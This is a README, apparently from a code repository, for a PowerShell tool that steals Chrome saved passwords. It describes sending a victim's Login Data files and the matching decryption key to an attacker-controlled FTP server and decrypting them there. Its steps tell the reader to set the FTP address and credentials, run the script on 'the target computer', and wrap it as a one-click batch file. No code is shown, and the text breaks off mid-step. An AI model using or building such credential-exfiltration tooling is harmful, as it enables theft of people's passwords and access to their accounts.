# ChromePasswordDecryptionWithPS
Sending the Login Data files along with the unique byte sequence needed to decode the passwords to a FTP server. Then, decrypt those files on the server side.

HOW TO USE:
  1. Download the "chrSender.ps1" file and edit the ftp server address and ftp server credentials (these appear twice in the code make sure to edit both)
  2. Run this on the target computer (make sure your ftp server is running so it can receive the information)  
    - You can also change this ps1 file into a batch file so it can run on the target's computer with one click, this can be done like this:  
    ```
    test
    ```
  3. Once you re
